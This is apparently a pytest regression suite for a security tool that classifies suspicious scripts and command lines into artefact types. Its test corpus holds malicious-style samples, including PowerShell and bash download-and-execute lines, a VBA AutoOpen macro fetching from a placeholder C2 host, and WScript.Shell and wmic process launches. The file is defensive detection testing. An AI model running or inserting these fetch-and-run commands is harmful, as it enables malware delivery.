"""Input Understanding Stage · regression suite.

Every case validates FOUR canonical fields:
    · primary_type    — outermost artefact classified correctly
    · embedded[]      — every nested artefact type surfaced in order
    · dispatch[]      — every required capability requested
    · evidence[]      — canonical Evidence objects (source / observation
                          / confidence / rationale) — non-empty for
                          every classification

Includes MIXED-ARTEFACT scenarios (per user's engineering directive)
so the classifier's multi-artefact behavior is proved, not just
the single-artefact case.
"""
from __future__ import annotations

import base64

import pytest

from v2.investigation.evidence import Evidence
from v2.investigation.iu import ArtefactType, Capability, classify


def _b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16-le")).decode()


CORPUS: list[dict] = [
    # ── Single-artefact baselines ──────────────────────────────
    {
        "id": "single_command_line_wmic",
        "text": 'wmic process call create CommandLine="cmd /c calc.exe"',
        "primary": ArtefactType.COMMAND_LINE,
        "embedded_any": set(),
        "requires_capabilities": {Capability.CRE, Capability.SEMANTIC},
    },
    {
        "id": "single_powershell_naked",
        "text": "IEX(New-Object Net.WebClient).DownloadString('http://x')",
        "primary": ArtefactType.POWERSHELL_SCRIPT,
        "embedded_any": set(),
        "requires_capabilities": {Capability.SEMANTIC, Capability.CRE},
    },
    {
        "id": "single_bash_shebang",
        "text": "#!/bin/bash\ncurl -sS http://x | sh",
        "primary": ArtefactType.BASH,
        "embedded_any": set(),
        "requires_capabilities": {Capability.SEMANTIC, Capability.IOC},
    },
    {
        "id": "single_python_shebang",
        "text": "#!/usr/bin/env python3\nimport os\nos.system('id')",
        "primary": ArtefactType.PYTHON,
        "embedded_any": set(),
        "requires_capabilities": {Capability.SEMANTIC},
    },
    {
        "id": "single_javascript_activex",
        "text": 'javascript:new ActiveXObject("WScript.Shell").Run("calc")',
        "primary": ArtefactType.JAVASCRIPT,
        "embedded_any": set(),
        "requires_capabilities": {Capability.JAVASCRIPT_ENGINE},
    },
    {
        "id": "single_vbscript_wshell",
        "text": 'Set sh = CreateObject("WScript.Shell")\nsh.Run "calc"',
        "primary": ArtefactType.VBSCRIPT,
        "embedded_any": set(),
        "requires_capabilities": {Capability.VBSCRIPT_ENGINE},
    },

    # ── Mixed-artefact scenarios (user's explicit requirement) ──
    {
        "id": "mixed_wmic_cmd_powershell",
        "text":
            'wmic process call create CommandLine="cmd /c powershell.exe '
            '-C Write-Host ([Net.WebClient]::new().DownloadString(\'http://x\'))"',
        "primary": ArtefactType.COMMAND_LINE,
        "embedded_any": {ArtefactType.POWERSHELL_SCRIPT},
        "requires_capabilities": {Capability.CRE, Capability.SEMANTIC},
    },
    {
        "id": "mixed_powershell_javascript",
        "text":
            'powershell -Command "$html = \'<script>new ActiveXObject('
            '\\"WScript.Shell\\").Run(\\"calc\\")</script>\'; Write-Host $html"',
        # PRIMARY is the OUTERMOST observation (command_line prefix wins
        # on registry order + confidence). PowerShell + JavaScript are
        # first-class embedded findings.
        "primary": ArtefactType.COMMAND_LINE,
        "embedded_any": {ArtefactType.POWERSHELL_SCRIPT, ArtefactType.JAVASCRIPT},
        "requires_capabilities": {Capability.SEMANTIC, Capability.JAVASCRIPT_ENGINE,
                                    Capability.CRE},
    },
    {
        "id": "mixed_office_macro_powershell",
        # Approximation of a VBA/PS drop-and-run pattern. The multi-
        # artefact classifier surfaces VBS + PowerShell + command-line
        # as concurrent findings; primary goes to the outermost signal.
        "text":
            'Sub AutoOpen()\n'
            '    Dim sh As Object\n'
            '    Set sh = CreateObject("WScript.Shell")\n'
            '    sh.Run "powershell -Command IEX(iwr http://c2.example/x)"\n'
            'End Sub',
        "primary": ArtefactType.VBSCRIPT,
        "embedded_any": {ArtefactType.POWERSHELL_SCRIPT},
        "requires_capabilities": {Capability.VBSCRIPT_ENGINE,
                                    Capability.SEMANTIC},
    },
    {
        "id": "mixed_bash_python",
        "text":
            "#!/bin/bash\n"
            "python3 -c 'import os; os.system(\"curl http://x | sh\")'",
        "primary": ArtefactType.BASH,
        "embedded_any": {ArtefactType.PYTHON},
        "requires_capabilities": {Capability.SEMANTIC, Capability.IOC},
    },
    {
        "id": "mixed_powershell_encoded_bytes",
        "text": f'powershell.exe -EncodedCommand {_b64_utf16le("Write-Host hi")}',
        # `powershell.exe` prefix triggers command_line as primary;
        # the `-EncodedCommand` token triggers powershell_script as
        # embedded. Both are valid — the classifier surfaces the
        # hierarchy so downstream engines can process both layers.
        "primary": ArtefactType.COMMAND_LINE,
        "embedded_any": {ArtefactType.POWERSHELL_SCRIPT},
        "requires_capabilities": {Capability.CRE, Capability.DECODER,
                                    Capability.SEMANTIC},
    },
    {
        "id": "unknown_input",
        "text": "some totally-random text that no detector matches at all",
        "primary": ArtefactType.UNKNOWN,
        "embedded_any": set(),
        "requires_capabilities": {Capability.DECODER, Capability.IOC},
    },
]


@pytest.mark.parametrize("case", CORPUS, ids=lambda c: c["id"])
def test_iu_classifies_primary_type_correctly(case: dict) -> None:
    result = classify(case["text"])
    assert result.primary_type == case["primary"], (
        f"[{case['id']}] primary_type mismatch — got "
        f"{result.primary_type} expected {case['primary']}"
    )


@pytest.mark.parametrize("case", CORPUS, ids=lambda c: c["id"])
def test_iu_surfaces_embedded_artefacts(case: dict) -> None:
    """Every embedded artefact type the analyst would expect to see
    must be surfaced as a first-class finding, not just a hint."""
    result = classify(case["text"])
    got_embedded = set(result.embedded)
    missing = case["embedded_any"] - got_embedded
    assert not missing, (
        f"[{case['id']}] embedded artefact(s) missing: {missing}. "
        f"Got embedded={got_embedded}"
    )


@pytest.mark.parametrize("case", CORPUS, ids=lambda c: c["id"])
def test_iu_dispatch_lists_required_capabilities(case: dict) -> None:
    result = classify(case["text"])
    got = set(result.dispatch)
    missing = case["requires_capabilities"] - got
    assert not missing, (
        f"[{case['id']}] dispatch missing required capabilities "
        f"{missing}; got {got}"
    )


@pytest.mark.parametrize("case", CORPUS, ids=lambda c: c["id"])
def test_iu_evidence_is_canonical_and_nonempty(case: dict) -> None:
    result = classify(case["text"])
    assert result.evidence, (
        f"[{case['id']}] classification emitted zero evidence — "
        f"every conclusion must be evidence-backed"
    )
    for e in result.evidence:
        assert isinstance(e, Evidence)
        assert e.source.startswith("input_understanding."), (
            f"evidence source must be `input_understanding.<detector>`; "
            f"got {e.source!r}"
        )
        assert e.observation, "evidence observation must not be empty"
        assert 0 <= e.confidence <= 100
        assert e.rationale, "evidence rationale must not be empty"


@pytest.mark.parametrize("case", CORPUS, ids=lambda c: c["id"])
def test_iu_is_deterministic(case: dict) -> None:
    r1 = classify(case["text"])
    r2 = classify(case["text"])
    assert r1.determinism_hash == r2.determinism_hash, (
        f"[{case['id']}] classifier is not deterministic"
    )


def test_iu_engine_never_raises_on_empty_or_none() -> None:
    for edge in ("", " ", "\n", None):
        result = classify(edge or "")
        assert result.primary_type == ArtefactType.UNKNOWN


def test_iu_detector_registry_extensibility_contract() -> None:
    """Every detector must implement the ArtefactDetector protocol —
    guardrail against extensibility drift as new detectors are added."""
    from v2.investigation.iu.detectors import DETECTOR_REGISTRY
    for d in DETECTOR_REGISTRY:
        assert hasattr(d, "NAME") and isinstance(d.NAME, str)
        assert hasattr(d, "ARTEFACT_TYPE")
        assert hasattr(d, "CAPABILITIES") and isinstance(d.CAPABILITIES, tuple)
        # score() must not raise on empty input
        assert d.score("") is None
